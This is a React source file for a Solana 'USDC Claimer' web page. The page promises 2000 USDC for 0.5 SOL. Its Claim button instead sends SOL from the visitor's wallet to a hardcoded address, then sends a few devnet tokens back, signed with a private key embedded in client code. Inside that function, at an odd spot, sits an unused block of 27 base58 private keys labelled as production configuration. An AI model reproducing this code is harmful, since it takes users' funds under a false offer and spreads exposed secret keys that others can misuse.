/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3MQncVdFMizAhX2sRP4ibS17koH7siU9wZ6BDdDzCrRQHD8cKzkBLtu8SZyZ2EBSxXcW3VrqzbopwxUY8x6e1eeq"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4hQ1rZyMJ1z5S5KMLzLkLJibS5aArvfnVEG5k7azAUK9iTf6W6XyfSpKC3LJ2gwDJGpaXYdGrSypmn4k85JxrrBz",
  "key1": "4ZgDNqoZ5FLcPk4DaaMfaK4A4sBXMQq3VWsHbWoETP8C48BobiQtwmda3pX6nXpDJRw58Xzcu28tXEqjNY2bCV8K",
  "key2": "3fZG7NtF6po81fh7NLCgiLj7zditVdqJQac1pQh9A2XR8RtSqFK6e41Jw4Gvxa9X9zyoJxKWpHR6ciTBGw1k7rwo",
  "key3": "4CfhmY5AUNnmy5cCP21cAWyvy2SuJAbhmqP3JeRngsdq7XZuDYDzkGQZnn4YTGCGDvaTYZKouG5HtSGh1ScRntyW",
  "key4": "4JhKv2StSEmFL3BYLHoiuGbMMytAmWD4ZXoCt5ffNcWibUnETG8DgMPtf315NSEbowvNSTAdyrVKQd8PMbLyvNZM",
  "key5": "4YaxH28Sucs7Svy7xEhCHgjg9ArSUU5b2Q9cXiVddegzmcQmDu3eLYdzfotphBRuTXiiAC1q9jRdAR5AVNrRpz4s",
  "key6": "67crmx3zsm8zVkXWfV4RMtUxDpgGi95rhx8ymtAJG8Jj6khsfycYPpAnBiC6HY4PYm1m8UqYnYfKwtp3HS2LU3Pf",
  "key7": "3SjEKHSqXNNmCswUNrSxNYsvHusZJJaQvWdHrxKqDH9jbvyqpLgvNLyJu9VXsA9MFYATthNExrkqnsUAEjXwqppp",
  "key8": "4zXh1RS7PAiEWdfBSxxG9RvqVK8Qr8nYAv9oayj4mRdZu5J18XwVMkGie1KpmjFX2gJm1weKJg693mRKPZAKyPmY",
  "key9": "3LofARhY4xKRrVVUFy9yupZa7tc71nKK29N1jdC1sawvmctjcRyjJLZkWmVtGAWw3PC2bNfA9agdBVfrEcFnEyvB",
  "key10": "5uK3MA4j5eGddpgDLTjM56r5TWRujcsztfmagazhTnzPzitXXombsd3XN7oAkAHwi3psfWB3ifFi6zynFNjMBhiS",
  "key11": "5MRyqXjRHxxdtFND9Dq3ibUrb7ecBzxWEd5pLzoKiSmDWATmzmqJwSg2aJBCzNUJrbFG11EBHEdCRzGEY3uHSbSm",
  "key12": "5vZS4rN97eNTPWz9fgo9G3qXDVEDkzaSYU33QzCJgFMg9x9ZjvfgDVHmixw9wYmy5msT2qT5bmFHXDX3eCWKjCBa",
  "key13": "2cwVPjz3N1FEgR2mfxGLyYTg3hgqwgokLHrZh39VAZxMirdy5t3rQzCwAYmBehtU227W2ACQ36jv5uf65d84zB5d",
  "key14": "62i2xY8KJM1ThMJ9csKwSVWh6NSsPebdimwhBBhXrdsuccQAPuD4g4dGJybuR7CLio9ntv15738VC4HATkHJz2TC",
  "key15": "AyyJGnNspXESrc33ZGNUPN5Ujc2bGtUw69HgCcuBvRPpjEXMKr7xBmZ4QYbj5pJCwtqh6pNkTp5hzECBneaJvz8",
  "key16": "2EuFqTLDQmb9fRNPvVLFi7YhfhQCE9Xz3ojVgyikPmE3E12unvcDsUhfRA89YrAywqiKBzUdGnY4WfLdSG5nizyT",
  "key17": "4PYo6isgvuRiBM9iXKFkrUm5NnpresgZAhbjX3auTTbavToGTyQaks4MGPMqW7WewNNAe11p465EMGGTioJXHNr4",
  "key18": "3MMcSdzVmLbD4oWmi4zv1xyAfVx6PBMGucd8Kj769CwKbXVyecZt2hYWPF6pDuttAAjqJrhhzVpAdbp9GfxLj6YH",
  "key19": "2V8pFMQKqC9Zi6H5UnaWXtDzJ3k2TWqdwyk4bMeyEKdz3e5dvUYNhVAfhvixk8ENje8Kjxc5HQ3UyNxLGDNw1Txz",
  "key20": "3uNh6aNWE6MsfKxXuiBa9wZgswYyZ7eEJHhZhnJ82RAQr5Q3V1f4fJMitw55SykBtwDLV2L75ReGsZXaYFrCCR5M",
  "key21": "4siPDr1aTHrxjY1EPdT2G31qN2V52QHfTQXi2uHksmk2iRyK2WLFmMU43wxCsxvjNGuoHxzL29U99Ay1Z6whcooT",
  "key22": "2KuY2E3C6ia8XtwSjv5FLyW37jCecjhscvQNpzE3nPGVzjqmdhkvRtv8arFca71xKP88o8hKoNT5QdcvtKknWEgG",
  "key23": "4WE3RbxidWBaJt9Xtji7PKv5Qx6jL2sm5pWDeELZQmDrQL45xoD5R536NGffzcpZBacS6niG8o2mBT7pd1884PRz",
  "key24": "2r3nA9yvGLPF8FC332MEfE27Wb4BX5wCzKRihFbfyT7yS63K4i8iEGX44ThmPnBAqYe5zZkTM7at7nwsoJxG2ZV7",
  "key25": "4rwgQ1cHfbDkAk19YubohsW8MkXaxPTUBz28EFyDrWAjLpS5T8boSV2XhU4LFgAzwmrukUZqNiYbSjA9RrnAtrvB",
  "key26": "3pcGUiKx4YT4vuTWwqoLh3oLF1qVkrP1vsj8KUXfqtcQUPvpRJW32APkn8mVDhXjvSxeEcoWBFJF6Nt261dn3iN7"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
